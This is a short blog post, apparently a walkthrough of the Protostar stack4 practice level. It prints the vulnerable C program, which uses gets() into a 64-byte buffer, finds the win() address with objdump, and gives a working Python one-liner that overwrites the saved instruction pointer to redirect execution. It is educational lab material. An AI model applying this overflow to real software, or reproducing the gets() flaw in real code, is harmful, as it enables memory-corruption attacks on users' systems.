---
layout: post
title: "Overwriting the instruction pointer: protostar stack4"
date: 2018-10-28
categories: jekyll update
---
We can see this level is similar to the previous one, but with one major difference. 
{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{% endhighlight %}
There is a function, win() which we will attempt to call, but we are no longer given a function pointer to overwrite. 

We will need to write to the instruction pointer, in this case, it is specifically called the EIP. To do this, we first need to find the address of the win() function, because that is what we will write to the instruction pointer.

objdump is again perfect for this.

$objdump -D stack4 \| grep win

080483f4 \<win\>:

$

The address in this case is 0x80483f4.

We now just need to find the offset between the end of the buffer, which we will fill up, and the EIP we want to overwrite. This can be done by writing a script, trial and error, or we can just use what we did before (76 characters). The buffer is the same size, so we might as well give 76 a shot

$python -c 'print "A"*76' | ./stack4 

Segmentation fault

$

A segmentation fault is a good sign. We are overwriting the EIP, and causing it to access memory out of bounds. Just to be safe, we can test it at 75 characters and see if it segfaults.

$python -c 'print "A"*75' | ./stack4 

$

Looks like 76 is perfect, now we need to append the address of win(), in little endian byte order, and cause the program to execute the win() function.

$python -c 'print "A"*76 + "\xf4\x83\x04\x08"' | ./stack4

Code flow successfully changed

Segmentation fault

$

Looks like it works.
